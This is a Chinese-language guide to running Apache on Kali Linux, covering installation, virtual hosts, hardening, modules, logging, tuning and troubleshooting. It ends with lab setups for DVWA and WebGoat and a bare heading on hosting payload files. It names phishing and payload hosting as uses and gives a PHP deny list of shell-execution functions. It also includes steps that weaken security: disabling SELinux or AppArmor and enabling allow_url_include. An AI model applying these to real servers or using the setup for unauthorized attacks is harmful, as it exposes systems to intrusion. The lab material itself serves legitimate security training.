# Kali Linux中Apache完整使用指南

## 一、Apache简介与用途

### 在Kali Linux中的应用场景
- **渗透测试环境搭建** - 模拟真实Web服务器环境
- **Web应用安全测试** - 测试SQL注入、XSS等漏洞
- **钓鱼页面测试**（仅限授权测试） - 社会工程学演练
- **托管安全工具和脚本** - 部署BeEF、Metasploit Payloads等
- **搭建本地测试环境** - DVWA、WebGoat等靶场
- **反向代理和流量分析** - 拦截和分析HTTP/HTTPS流量
- **文件传输服务器** - 在内网渗透中快速传输文件

## 二、安装与基础配置

### 1. 安装Apache2
```bash
# 更新软件包列表
sudo apt update

# 安装Apache2
sudo apt install apache2 -y

# 检查安装版本
apache2 -v

# 验证安装
curl -I http://localhost
```

### 2. 基本服务管理
```bash
# 启动Apache服务
sudo systemctl start apache2

# 停止Apache服务
sudo systemctl stop apache2

# 重启Apache服务
sudo systemctl restart apache2

# 重载配置（不中断服务）
sudo systemctl reload apache2

# 查看服务状态
sudo systemctl status apache2

# 设置开机自启
sudo systemctl enable apache2

# 取消开机自启
sudo systemctl disable apache2

# 优雅关闭（等待当前请求完成）
sudo apache2ctl graceful-stop
```

### 3. 快速验证
```bash
# 浏览器访问
http://localhost
http://127.0.0.1
http://[本机IP]

# 命令行测试
curl http://localhost
wget http://localhost -O -

# 查看监听端口
sudo ss -tlnp | grep apache2
```

## 三、目录结构与配置文件

### 重要目录说明
```
/etc/apache2/              # 主配置目录
├── apache2.conf          # 主配置文件（全局设置）
├── ports.conf            # 端口配置
├── envvars               # 环境变量
├── magic                 # MIME类型检测
├── sites-available/      # 可用站点配置
│   ├── 000-default.conf # 默认HTTP站点
│   └── default-ssl.conf # 默认HTTPS站点
├── sites-enabled/        # 已启用站点（符号链接）
├── mods-available/       # 可用模块
├── mods-enabled/         # 已启用模块
├── conf-available/       # 可用配置片段
└── conf-enabled/         # 已启用配置

/var/www/                 # Web根目录
├── html/                 # 默认网站目录
└── [其他站点目录]

/var/log/apache2/         # 日志文件目录
├── access.log           # 访问日志
├── error.log            # 错误日志
└── other_vhosts_access.log  # 其他虚拟主机日志

/usr/lib/cgi-bin/        # CGI脚本目录
/usr/share/apache2/      # Apache共享文件
```

### 配置文件加载顺序
1. `apache2.conf` - 主配置
2. `ports.conf` - 端口设置
3. `mods-enabled/*.conf` - 已启用模块配置
4. `conf-enabled/*.conf` - 已启用的配置片段
5. `sites-enabled/*.conf` - 已启用的站点配置

## 四、基础配置操作

### 1. 修改默认端口
```bash
# 编辑端口配置文件
sudo nano /etc/apache2/ports.conf

# 修改监听端口（例如改为8080）
Listen 8080

# 如需监听多个端口
Listen 80
Listen 8080
Listen 8443

# 同时修改虚拟主机配置
sudo nano /etc/apache2/sites-available/000-default.conf
# 将 <VirtualHost *:80> 改为 <VirtualHost *:8080>

# 测试配置
sudo apache2ctl configtest

# 重启服务生效
sudo systemctl restart apache2

# 验证端口
sudo netstat -tlnp | grep apache2
```

### 2. 配置虚拟主机（基于域名）
```bash
# 创建网站目录
sudo mkdir -p /var/www/testsite/public_html
sudo mkdir -p /var/www/testsite/logs

# 创建测试页面
echo "<h1>Test Site</h1>" | sudo tee /var/www/testsite/public_html/index.html

# 设置权限
sudo chown -R www-data:www-data /var/www/testsite
sudo chmod -R 755 /var/www/testsite

# 创建虚拟主机配置
sudo nano /etc/apache2/sites-available/testsite.conf
```

**完整虚拟主机配置示例：**
```apache
<VirtualHost *:80>
    # 基本信息
    ServerName testsite.local
    ServerAlias www.testsite.local *.testsite.local
    ServerAdmin admin@testsite.local
    
    # 目录配置
    DocumentRoot /var/www/testsite/public_html
    
    <Directory /var/www/testsite/public_html>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        Require all granted
        
        # 默认索引文件
        DirectoryIndex index.html index.php
    </Directory>
    
    # 日志配置
    ErrorLog /var/www/testsite/logs/error.log
    CustomLog /var/www/testsite/logs/access.log combined
    
    # 日志级别
    LogLevel warn
</VirtualHost>
```

**启用站点：**
```bash
# 启用站点
sudo a2ensite testsite.conf

# 禁用站点
sudo a2dissite testsite.conf

# 禁用默认站点
sudo a2dissite 000-default.conf

# 测试配置
sudo apache2ctl configtest

# 重载配置
sudo systemctl reload apache2

# 添加hosts记录（本地测试）
echo "127.0.0.1 testsite.local" | sudo tee -a /etc/hosts

# 测试访问
curl http://testsite.local
```

### 3. 基于IP的虚拟主机
```apache
<VirtualHost 192.168.1.100:80>
    ServerName site1.example.com
    DocumentRoot /var/www/site1
</VirtualHost>

<VirtualHost 192.168.1.101:80>
    ServerName site2.example.com
    DocumentRoot /var/www/site2
</VirtualHost>
```

### 4. 基于端口的虚拟主机
```apache
Listen 8080
Listen 8081

<VirtualHost *:8080>
    DocumentRoot /var/www/site1
</VirtualHost>

<VirtualHost *:8081>
    DocumentRoot /var/www/site2
</VirtualHost>
```

## 五、安全配置

### 1. 隐藏Apache版本和系统信息
```bash
# 编辑安全配置
sudo nano /etc/apache2/conf-enabled/security.conf

# 修改以下配置
ServerTokens Prod          # 仅显示"Apache"
ServerSignature Off        # 关闭页面签名
TraceEnable Off           # 禁用TRACE方法

# 可选：完全隐藏服务器信息
# ServerTokens ProductOnly
# Header always unset "X-Powered-By"

# 重启服务
sudo systemctl restart apache2

# 验证
curl -I http://localhost
```

### 2. 目录访问控制
```apache
# 禁止目录浏览
<Directory /var/www/html>
    Options -Indexes
</Directory>

# 基于IP的访问控制（允许特定IP）
<Directory /var/www/html/admin>
    Require ip 192.168.1.0/24
    Require ip 127.0.0.1
    Require ip ::1
</Directory>

# 拒绝特定IP
<Directory /var/www/html/public>
    <RequireAll>
        Require all granted
        Require not ip 10.0.0.0/8
    </RequireAll>
</Directory>

# 基于用户代理的控制
<Directory /var/www/html>
    <RequireAll>
        Require all granted
        Require not env blockbots
    </RequireAll>
    SetEnvIfNoCase User-Agent "BadBot" blockbots
</Directory>
```

### 3. 基于密码的访问控制
```bash
# 创建密码文件（第一个用户使用-c创建文件）
sudo htpasswd -c /etc/apache2/.htpasswd admin

# 添加更多用户（不使用-c）
sudo htpasswd /etc/apache2/.htpasswd user2

# 删除用户
sudo htpasswd -D /etc/apache2/.htpasswd user2

# 查看用户列表
sudo cat /etc/apache2/.htpasswd

# 配置认证
sudo nano /etc/apache2/sites-available/000-default.conf
```

**认证配置示例：**
```apache
<Directory /var/www/html/secure>
    AuthType Basic
    AuthName "Restricted Area - Authentication Required"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
    
    # 或指定特定用户
    # Require user admin user2
    
    # 或指定用户组
    # AuthGroupFile /etc/apache2/.htgroup
    # Require group admins
</Directory>
```

### 4. 文件和目录安全
```apache
# 保护敏感文件
<FilesMatch "^\.ht">
    Require all denied
</FilesMatch>

<FilesMatch "\.(bak|config|sql|log|sh)$">
    Require all denied
</FilesMatch>

# 禁止执行某些目录中的PHP
<Directory /var/www/html/uploads>
    php_flag engine off
    AddType text/plain .php .php3 .phtml
</Directory>

# 限制HTTP方法
<Directory /var/www/html>
    <LimitExcept GET POST>
        Require all denied
    </LimitExcept>
</Directory>
```

### 5. 防止点击劫持和XSS
```apache
# 启用headers模块
sudo a2enmod headers

# 添加安全头
<IfModule mod_headers.c>
    # 防止点击劫持
    Header always set X-Frame-Options "SAMEORIGIN"
    
    # XSS保护
    Header always set X-XSS-Protection "1; mode=block"
    
    # 防止MIME类型嗅探
    Header always set X-Content-Type-Options "nosniff"
    
    # 引荐来源政策
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    
    # 内容安全策略
    Header always set Content-Security-Policy "default-src 'self'"
    
    # HSTS（仅HTTPS使用）
    # Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
</IfModule>
```

### 6. 限制请求大小和超时
```apache
# 在apache2.conf或虚拟主机配置中添加
LimitRequestBody 10485760        # 限制请求体为10MB
LimitRequestFields 100           # 限制请求头字段数量
LimitRequestFieldSize 8190       # 限制请求头字段大小
LimitRequestLine 8190            # 限制请求行大小

Timeout 300                      # 请求超时时间（秒）
KeepAliveTimeout 5              # 保持连接超时时间
```

## 六、常用模块配置

### 1. URL重写模块（mod_rewrite）
```bash
# 启用模块
sudo a2enmod rewrite
sudo systemctl restart apache2

# 验证模块加载
apache2ctl -M | grep rewrite
```

**常用重写规则示例：**
```apache
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>

# 在.htaccess或虚拟主机配置中
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    
    # 强制HTTPS
    RewriteCond %{HTTPS} off
    RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]
    
    # 强制www
    RewriteCond %{HTTP_HOST} !^www\. [NC]
    RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]
    
    # 去除www
    RewriteCond %{HTTP_HOST} ^www\.(.+)$ [NC]
    RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
    
    # URL美化（移除.php扩展名）
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_FILENAME}.php -f
    RewriteRule ^(.*)$ $1.php [L]
    
    # 阻止访问隐藏文件
    RewriteRule "^\.(.*)$" "-" [F]
    
    # 重定向旧URL到新URL
    RewriteRule ^old-page\.html$ /new-page.html [R=301,L]
</IfModule>
```

### 2. SSL/TLS配置
```bash
# 启用SSL模块
sudo a2enmod ssl
sudo a2enmod socache_shmcb

# 创建自签名证书（测试用）
sudo mkdir -p /etc/apache2/ssl
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/apache2/ssl/apache-selfsigned.key \
    -out /etc/apache2/ssl/apache-selfsigned.crt \
    -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"

# 生成强DH参数（可选，增强安全性）
sudo openssl dhparam -out /etc/apache2/ssl/dhparam.pem 2048

# 配置SSL虚拟主机
sudo nano /etc/apache2/sites-available/default-ssl.conf
```

**完整SSL虚拟主机配置：**
```apache
<IfModule mod_ssl.c>
    <VirtualHost *:443>
        ServerName localhost
        ServerAdmin admin@localhost
        DocumentRoot /var/www/html
        
        # SSL引擎
        SSLEngine on
        
        # 证书文件
        SSLCertificateFile /etc/apache2/ssl/apache-selfsigned.crt
        SSLCertificateKeyFile /etc/apache2/ssl/apache-selfsigned.key
        
        # 可选：DH参数
        # SSLOpenSSLConfCmd DHParameters /etc/apache2/ssl/dhparam.pem
        
        # SSL协议和加密套件（推荐配置）
        SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
        SSLCipherSuite HIGH:!aNULL:!MD5:!3DES
        SSLHonorCipherOrder on
        
        # HSTS头（启用后）
        <IfModule mod_headers.c>
            Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
        </IfModule>
        
        # 目录配置
        <Directory /var/www/html>
            Options -Indexes +FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>
        
        # 日志
        ErrorLog ${APACHE_LOG_DIR}/ssl-error.log
        CustomLog ${APACHE_LOG_DIR}/ssl-access.log combined
        LogLevel warn
    </VirtualHost>
</IfModule>
```

**启用SSL站点：**
```bash
# 启用SSL站点
sudo a2ensite default-ssl.conf

# 重启Apache
sudo systemctl restart apache2

# 测试HTTPS访问
curl -k https://localhost

# 查看证书信息
openssl s_client -connect localhost:443 -showcerts
```

**使用Let's Encrypt免费证书（生产环境）：**
```bash
# 安装Certbot
sudo apt install certbot python3-certbot-apache -y

# 自动配置SSL
sudo certbot --apache -d yourdomain.com -d www.yourdomain.com

# 仅获取证书不自动配置
sudo certbot certonly --apache -d yourdomain.com

# 测试自动续期
sudo certbot renew --dry-run

# 查看已安装证书
sudo certbot certificates
```

### 3. PHP支持
```bash
# 安装PHP及常用扩展
sudo apt install php libapache2-mod-php php-mysql php-gd php-curl php-xml php-mbstring -y

# 配置PHP作为默认索引
sudo nano /etc/apache2/mods-enabled/dir.conf

# 修改DirectoryIndex，将index.php放在前面
DirectoryIndex index.php index.html index.cgi index.pl index.xhtml index.htm

# 重启Apache
sudo systemctl restart apache2

# 创建测试文件
echo "<?php phpinfo(); ?>" | sudo tee /var/www/html/info.php

# 访问测试
curl http://localhost/info.php

# 安全起见，测试后删除
sudo rm /var/www/html/info.php
```

**PHP安全配置：**
```bash
# 编辑php.ini
sudo nano /etc/php/8.2/apache2/php.ini  # 版本号可能不同

# 推荐安全设置
expose_php = Off
display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
allow_url_fopen = Off
allow_url_include = Off
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
max_execution_time = 30
max_input_time = 60
memory_limit = 128M
upload_max_filesize = 10M
post_max_size = 10M

# 重启生效
sudo systemctl restart apache2
```

### 4. 代理模块（反向代理）
```bash
# 启用代理模块
sudo a2enmod proxy
sudo a2enmod proxy_http
sudo a2enmod proxy_balancer
sudo a2enmod lbmethod_byrequests

# 重启Apache
sudo systemctl restart apache2
```

**反向代理配置示例：**
```apache
<VirtualHost *:80>
    ServerName proxy.example.com
    
    # 代理到后端应用
    ProxyPreserveHost On
    ProxyPass / http://localhost:3000/
    ProxyPassReverse / http://localhost:3000/
    
    # 或代理到远程服务器
    # ProxyPass / http://backend-server:8080/
    # ProxyPassReverse / http://backend-server:8080/
    
    # 负载均衡示例
    <Proxy balancer://mycluster>
        BalancerMember http://backend1:8080
        BalancerMember http://backend2:8080
        ProxySet lbmethod=byrequests
    </Proxy>
    ProxyPass / balancer://mycluster/
    ProxyPassReverse / balancer://mycluster/
</VirtualHost>
```

### 5. 其他有用模块
```bash
# 启用压缩
sudo a2enmod deflate

# 启用缓存
sudo a2enmod cache
sudo a2enmod cache_disk
sudo a2enmod expires
sudo a2enmod headers

# 启用HTTP/2（需要SSL）
sudo a2enmod http2

# 启用速率限制
sudo a2enmod ratelimit

# 启用用户目录
sudo a2enmod userdir

# 查看所有可用模块
ls /etc/apache2/mods-available/

# 查看已启用模块
apache2ctl -M
```

## 七、日志管理与监控

### 1. 日志文件说明
```bash
# 主要日志文件
/var/log/apache2/access.log     # 访问日志
/var/log/apache2/error.log      # 错误日志
/var/log/apache2/other_vhosts_access.log  # 其他虚拟主机日志

# 查看日志
sudo tail -f /var/log/apache2/access.log
sudo tail -f /var/log/apache2/error.log

# 查看最近100行
sudo tail -n 100 /var/log/apache2/access.log

# 搜索特定内容
sudo grep "404" /var/log/apache2/access.log
sudo grep -i "error" /var/log/apache2/error.log
```

### 2. 日志格式配置
```apache
# 在apache2.conf或虚拟主机配置中
# Common日志格式
LogFormat "%h %l %u %t \"%r\" %>s %b" common

# Combined日志格式（推荐）
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined

# 自定义日志格式
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %D %{X-Forwarded-For}i" custom

# 使用自定义格式
CustomLog ${APACHE_LOG_DIR}/access.log custom

# 字段说明：
# %h - 客户端IP
# %l - 远程登录名
# %u - 认证用户名
# %t - 时间戳
# %r - 请求行
# %>s - 状态码
# %b - 响应大小
# %D - 请求处理时间（微秒）
# %{Referer}i - 引荐页
# %{User-Agent}i - 用户代理
```

### 3. 日志分析
```bash
# 统计访问最多的IP
sudo awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# 统计请求的URL
sudo awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# 统计HTTP状态码
sudo awk '{print $9}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# 统计User-Agent
sudo awk -F'"' '{print $6}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -10

# 查找404错误
sudo grep " 404 " /var/log/apache2/access.log

# 查找5xx错误
sudo grep " 50[0-9] " /var/log/apache2/access.log

# 统计每小时的请求数
sudo awk '{print $4}' /var/log/apache2/access.log | cut -d: -f2 | sort | uniq -c

# 查看慢请求（假设使用%D记录时间）
sudo awk '$NF > 1000000 {print $0}' /var/log/apache2/access.log

# 实时监控访问（彩色显示）
sudo tail -f /var/log/apache2/access.log | awk '{print "\033[1;32m"$1"\033[0m", $7, "\033[1;33m"$9"\033[0m"}'
```

### 4. 使用日志分析工具
```bash
# 安装GoAccess（实时日志分析工具）
sudo apt install goaccess -y

# 实时终端分析
sudo goaccess /var/log/apache2/access.log -c

# 生成HTML报告
sudo goaccess /var/log/apache2/access.log -o /var/www/html/report.html --log-format=COMBINED

# 实时更新HTML报告
sudo goaccess /var/log/apache2/access.log -o /var/www/html/report.html --log-format=COMBINED --real-time-html

# 安装AWStats（传统日志分析工具）
sudo apt install awstats -y

# 安装Webalizer
sudo apt install webalizer -y
```

### 5. 日志轮换配置
```bash
# 查看当前配置
sudo cat /etc/logrotate.d/apache2

# 编辑日志轮换配置
sudo nano /etc/logrotate.d/apache2
```

**日志轮换配置示例：**
```
/var/log/apache2/*.log {
    daily                    # 每日轮换
    missingok               # 日志丢失不报错
    rotate 14               # 保留14个旧日志
    compress                # 压缩旧日志
    delaycompress          # 延迟压缩（下次轮换时压缩）
    notifempty             # 空日志不轮换
    create 640 root adm    # 创建新日志的权限
    sharedscripts          # 所有日志轮换完后执行一次脚本
    postrotate
        if systemctl is-active --quiet apache2 ; then \
            systemctl reload apache2 > /dev/null 2>&1; \
        fi
    endscript
}
```

```bash
# 手动执行日志轮换
sudo logrotate -f /etc/logrotate.d/apache2

# 测试日志轮换（不实际执行）
sudo logrotate -d /etc/logrotate.d/apache2

# 查看日志轮换状态
sudo cat /var/lib/logrotate/status
```

### 6. 错误日志级别
```apache
# 在apache2.conf或虚拟主机配置中设置
LogLevel warn              # 默认级别

# 可用级别（从低到高）：
# emerg  - 紧急情况
# alert  - 立即采取行动
# crit   - 严重情况
# error  - 错误情况
# warn   - 警告情况
# notice - 正常但重要的情况
# info   - 信息性消息
# debug  - 调试信息
# trace1-8 - 跟踪信息（非常详细）

# 为特定模块设置日志级别
LogLevel warn ssl:info rewrite:trace3

# 开发环境可以使用更详细的日志
LogLevel info ssl:debug
```

## 八、性能优化

### 1. 启用压缩
```bash
# 启用deflate模块
sudo a2enmod deflate
sudo systemctl restart apache2

# 配置压缩规则
sudo nano /etc/apache2/mods-available/deflate.conf
```

**压缩配置示例：**
```apache
<IfModule mod_deflate.c>
    # 压缩输出
    AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css
    AddOutputFilterByType DEFLATE application/javascript application/json
    AddOutputFilterByType DEFLATE application/xml application/xhtml+xml
    AddOutputFilterByType DEFLATE application/rss+xml application/atom+xml
    AddOutputFilterByType DEFLATE image/svg+xml
    AddOutputFilterByType DEFLATE application/font-woff application/font-woff2
    
    # 排除已压缩的文件类型
    SetEnvIfNoCase Request_URI \.(?:gif|jpe?g|png|zip|gz|rar|bz2|pdf|mp3|mp4|avi)$ no-gzip
    
    # 排除旧版浏览器
    BrowserMatch ^Mozilla/4 gzip-only-text/html
    BrowserMatch ^Mozilla/4\.0[678] no-gzip
    BrowserMatch \bMSIE !no-gzip !gzip-only-text/html
    
    # 确保代理正确处理
    Header append Vary User-Agent env=!dont-vary
</IfModule>
```

### 2. 配置缓存
```bash
# 启用缓存相关模块
sudo a2enmod cache
sudo a2enmod cache_disk
sudo a2enmod expires
sudo a2enmod headers
sudo systemctl restart apache2
```

**缓存配置示例：**
```apache
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresDefault "access plus 1 month"
    
    # HTML
    ExpiresByType text/html "access plus 1 hour"
    
    # CSS和JavaScript
    ExpiresByType text/css "access plus 1 year"
    ExpiresByType application/javascript "access plus 1 year"
    ExpiresByType application/x-javascript "access plus 1 year"
    
    # 图片
    ExpiresByType image/jpeg "access plus 1 year"
    ExpiresByType image/png "access plus 1 year"
    ExpiresByType image/gif "access plus 1 year"
    ExpiresByType image/svg+xml "access plus 1 year"
    ExpiresByType image/x-icon "access plus 1 year"
    
    # 字体
    ExpiresByType font/woff "access plus 1 year"
    ExpiresByType font/woff2 "access plus 1 year"
    ExpiresByType application/font-woff "access plus 1 year"
    ExpiresByType application/font-woff2 "access plus 1 year"
    
    # 视频和音频
    ExpiresByType video/mp4 "access plus 1 year"
    ExpiresByType audio/mpeg "access plus 1 year"
</IfModule>

<IfModule mod_headers.c>
    # 为静态资源添加缓存控制
    <FilesMatch "\.(js|css|xml|gz|html)$">
        Header append Cache-Control "public"
    </FilesMatch>
    
    <FilesMatch "\.(jpg|jpeg|png|gif|swf|ico|svg)$">
        Header set Cache-Control "max-age=31536000, public"
    </FilesMatch>
    
    # 移除ETag（可选）
    Header unset ETag
    FileETag None
</IfModule>

# 磁盘缓存配置
<IfModule mod_cache_disk.c>
    CacheRoot /var/cache/apache2/mod_cache_disk
    CacheEnable disk /
    CacheDirLevels 2
    CacheDirLength 1
    CacheMaxFileSize 1000000
    CacheMinFileSize 1
    CacheDefaultExpire 3600
</IfModule>
```

**创建缓存目录：**
```bash
sudo mkdir -p /var/cache/apache2/mod_cache_disk
sudo chown -R www-data:www-data /var/cache/apache2/mod_cache_disk
```

### 3. 优化MPM（多处理模块）
```bash
# 查看当前使用的MPM
apache2ctl -V | grep -i mpm

# 可用的MPM模块
# - prefork: 多进程，每个进程一个线程（兼容性最好）
# - worker: 多进程多线程
# - event: 类似worker，性能更好（推荐）

# 切换到event MPM（推荐用于高性能）
sudo a2dismod mpm_prefork
sudo a2enmod mpm_event
sudo systemctl restart apache2
```

**Event MPM配置优化：**
```bash
sudo nano /etc/apache2/mods-available/mpm_event.conf
```

```apache
<IfModule mpm_event_module>
    StartServers             2      # 启动时的进程数
    MinSpareThreads          25     # 最小空闲线程数
    MaxSpareThreads          75     # 最大空闲线程数
    ThreadLimit              64     # 每个子进程的最大线程数
    ThreadsPerChild          25     # 每个子进程的线程数
    MaxRequestWorkers        150    # 最大并发请求数
    MaxConnectionsPerChild   0      # 子进程处理的最大请求数（0=无限）
</IfModule>
```

**Prefork MPM配置（如果使用）：**
```apache
<IfModule mpm_prefork_module>
    StartServers             5
    MinSpareServers          5
    MaxSpareServers          10
    MaxRequestWorkers        150
    MaxConnectionsPerChild   0
</IfModule>
```

### 4. 启用HTTP/2
```bash
# 启用HTTP/2模块（需要SSL）
sudo a2enmod http2

# 在SSL虚拟主机中启用
sudo nano /etc/apache2/sites-available/default-ssl.conf

# 添加以下行
Protocols h2 http/1.1

# 重启Apache
sudo systemctl restart apache2

# 测试HTTP/2
curl -I --http2 https://localhost
```

### 5. KeepAlive优化
```bash
sudo nano /etc/apache2/apache2.conf
```

```apache
# 启用持久连接
KeepAlive On

# 持久连接的最大请求数
MaxKeepAliveRequests 100

# 持久连接超时时间（秒）
KeepAliveTimeout 5
```

### 6. 禁用不必要的模块
```bash
# 查看已启用的模块
apache2ctl -M

# 禁用不需要的模块以减少内存占用
sudo a2dismod status
sudo a2dismod autoindex
sudo a2dismod negotiation

# 重启Apache
sudo systemctl restart apache2
```

### 7. 资源限制配置
```apache
# 在apache2.conf中配置
Timeout 300
KeepAliveTimeout 5
MaxKeepAliveRequests 100

# 限制请求大小
LimitRequestBody 10485760
LimitRequestFields 100
LimitRequestFieldSize 8190
LimitRequestLine 8190

# 限制请求速率（需要mod_ratelimit）
<IfModule mod_ratelimit.c>
    <Location /downloads>
        SetOutputFilter RATE_LIMIT
        SetEnv rate-limit 400
    </Location>
</IfModule>
```

## 九、故障排查

### 1. 配置测试命令
```bash
# 测试配置文件语法
sudo apache2ctl configtest
sudo apachectl -t

# 显示编译的设置
apache2ctl -V

# 显示已加载的模块
apache2ctl -M
apache2ctl -l  # 显示静态编译的模块

# 显示虚拟主机配置
apache2ctl -S

# 显示MPM设置
apache2ctl -V | grep -i mpm

# 完整配置转储
apache2ctl -t -D DUMP_VHOSTS
apache2ctl -t -D DUMP_RUN_CFG
```

### 2. 端口和进程检查
```bash
# 检查Apache是否运行
sudo systemctl status apache2
ps aux | grep apache2

# 检查端口占用
sudo netstat -tlnp | grep :80
sudo ss -tlnp | grep :80
sudo lsof -i :80
sudo lsof -i :443

# 检查端口是否被其他程序占用
sudo fuser 80/tcp
sudo fuser 443/tcp

# 终止占用端口的进程
sudo fuser -k 80/tcp
```

### 3. 权限问题排查
```bash
# 检查文件权限
ls -la /var/www/html

# 正确的权限设置
sudo chown -R www-data:www-data /var/www/html
sudo find /var/www/html -type d -exec chmod 755 {} \;
sudo find /var/www/html -type f -exec chmod 644 {} \;

# 检查SELinux状态（如果启用）
getenforce
sestatus

# 临时禁用SELinux测试
sudo setenforce 0

# 检查AppArmor状态
sudo aa-status

# 如果有权限问题，临时禁用Apache的AppArmor配置
sudo aa-complain /usr/sbin/apache2
```

### 4. 日志实时监控
```bash
# 同时监控访问和错误日志
sudo tail -f /var/log/apache2/access.log /var/log/apache2/error.log

# 使用multitail（需要安装）
sudo apt install multitail
sudo multitail /var/log/apache2/access.log /var/log/apache2/error.log

# 过滤特定错误
sudo tail -f /var/log/apache2/error.log | grep -i "error\|warning"

# 查看系统日志中的Apache相关信息
sudo journalctl -u apache2 -f
sudo journalctl -u apache2 --since "10 minutes ago"
```

### 5. 常见问题及解决方案

**问题1：Apache无法启动**
```bash
# 检查详细错误信息
sudo systemctl status apache2 -l
sudo journalctl -xe | grep apache

# 测试配置
sudo apache2ctl configtest

# 检查端口冲突
sudo netstat -tlnp | grep :80

# 查看错误日志
sudo tail -50 /var/log/apache2/error.log
```

**问题2：403 Forbidden错误**
```bash
# 检查目录权限
ls -la /var/www/html

# 检查Apache配置
sudo grep -r "Require" /etc/apache2/

# 确保目录有正确的权限
sudo chmod 755 /var/www/html
sudo chown -R www-data:www-data /var/www/html

# 检查SELinux上下文
ls -Z /var/www/html
sudo chcon -R -t httpd_sys_content_t /var/www/html
```

**问题3：404 Not Found错误**
```bash
# 检查DocumentRoot设置
apache2ctl -S

# 检查文件是否存在
ls -la /var/www/html/

# 检查虚拟主机配置
sudo cat /etc/apache2/sites-enabled/000-default.conf
```

**问题4：500 Internal Server Error**
```bash
# 查看错误日志获取详细信息
sudo tail -50 /var/log/apache2/error.log

# 常见原因：
# - .htaccess语法错误
# - PHP错误
# - 权限问题
# - 模块未启用

# 检查.htaccess
sudo cat /var/www/html/.htaccess

# 临时禁用.htaccess测试
# 在虚拟主机配置中设置: AllowOverride None
```

**问题5：PHP不工作**
```bash
# 检查PHP模块是否加载
apache2ctl -M | grep php

# 重新安装PHP模块
sudo apt install --reinstall libapache2-mod-php

# 启用PHP模块
sudo a2enmod php8.2  # 版本号根据实际情况

# 检查PHP配置
php -v
php -m

# 重启Apache
sudo systemctl restart apache2
```

**问题6：SSL证书问题**
```bash
# 测试SSL配置
openssl s_client -connect localhost:443

# 检查证书有效期
openssl x509 -in /etc/apache2/ssl/apache-selfsigned.crt -noout -dates

# 检查证书和密钥是否匹配
openssl x509 -noout -modulus -in /etc/apache2/ssl/cert.crt | openssl md5
openssl rsa -noout -modulus -in /etc/apache2/ssl/cert.key | openssl md5
```

### 6. 性能诊断
```bash
# 使用Apache Bench测试性能
ab -n 1000 -c 10 http://localhost/

# 参数说明：
# -n: 总请求数
# -c: 并发数
# -t: 测试时间（秒）

# 使用Apache自带的server-status
sudo a2enmod status
# 在配置中添加：
# <Location "/server-status">
#     SetHandler server-status
#     Require local
# </Location>

# 访问状态页面
curl http://localhost/server-status

# 查看Apache进程资源使用
ps aux | grep apache2 | awk '{sum+=$6} END {print "Total Memory (KB): " sum}'

# 使用top监控
top -p $(pgrep -d',' apache2)
```

### 7. 调试技巧
```bash
# 启用详细日志
sudo nano /etc/apache2/apache2.conf
# 设置: LogLevel debug

# 启用模块调试
LogLevel warn ssl:trace3 rewrite:trace8

# 使用strace跟踪Apache进程
sudo strace -p $(pgrep apache2 | head -1)

# 检查Apache配置包含关系
apache2ctl -t -D DUMP_INCLUDES

# 测试特定虚拟主机
curl -H "Host: testsite.local" http://localhost/
```

## 十、渗透测试应用场景

### 1. 搭建DVWA测试环境
```bash
# 安装必要软件
sudo apt install apache2 mysql-server php libapache2-mod-php php-mysql php-gd -y

# 下载DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git

# 配置权限
sudo chown -R www-data:www-data /var/www/html/DVWA
sudo chmod -R 755 /var/www/html/DVWA

# 配置数据库
sudo mysql -u root -p
```

```sql
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

```bash
# 配置DVWA
cd /var/www/html/DVWA/config
sudo cp config.inc.php.dist config.inc.php
sudo nano config.inc.php

# 修改数据库配置
$_DVWA[ 'db_user' ] = 'dvwa';
$_DVWA[ 'db_password' ] = 'p@ssw0rd';
$_DVWA[ 'db_database' ] = 'dvwa';

# 配置PHP
sudo nano /etc/php/8.2/apache2/php.ini
# 修改: allow_url_include = On

# 重启Apache
sudo systemctl restart apache2

# 访问DVWA进行初始化
# http://localhost/DVWA/setup.php
# 默认账号: admin / password
```

### 2. 搭建WebGoat环境
```bash
# 安装Java
sudo apt install default-jdk -y

# 下载WebGoat
cd /opt
sudo wget https://github.com/WebGoat/WebGoat/releases/download/v8.2.2/webgoat-server-8.2.2.jar

# 运行WebGoat
java -jar webgoat-server-8.2.2.jar

# 使用Apache反向代理
sudo a2enmod proxy proxy_http
```

**反向代理配置：**
```apache
<VirtualHost *:80>
    ServerName webgoat.local
    
    ProxyPreserveHost On
    ProxyPass / http://localhost:8080/
    ProxyPassReverse / http://localhost:8080/
    
    ErrorLog ${APACHE_LOG_DIR}/webgoat-error.log
    CustomLog ${APACHE_LOG_DIR}/webgoat-access.log combined
</VirtualHost>
```

### 3. 托管Payload文件服务器
